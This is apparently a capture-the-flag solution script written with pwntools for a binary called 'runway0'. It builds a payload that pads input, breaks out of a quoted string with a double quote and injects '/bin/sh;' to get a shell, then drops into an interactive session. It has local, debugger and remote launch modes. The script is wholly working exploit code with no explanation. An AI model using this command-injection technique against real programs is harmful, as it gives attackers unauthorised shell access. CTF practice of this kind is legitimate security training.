#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("runway0")

gs = '''
b *main+197
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()


offset = 112
payload = b"A"*50
payload += b'"'
payload += b"A"*(112-len(payload))
payload += b"/bin/sh;\0"
io.sendlineafter(b"Give me a message to say!", payload)

io.interactive()
